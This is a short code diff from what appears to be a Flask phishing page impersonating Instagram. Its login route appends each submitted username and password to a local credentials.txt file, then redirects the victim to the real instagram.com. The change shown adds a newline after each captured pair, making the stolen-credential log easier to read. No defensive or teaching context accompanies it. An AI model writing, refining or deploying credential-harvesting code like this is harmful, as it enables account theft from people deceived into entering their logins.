@@ -8,7 +8,7 @@ def login():
         print(request.form)
         f=open("credentials.txt", "a+")
         data=request.form
-        f.write(data['username']+' : '+data['password'])
+        f.write(data['username']+' : '+data['password']+"\n")
         f.close()
         return redirect("http://www.instagram.com")
 @app.route('/allah',methods=['GET'])
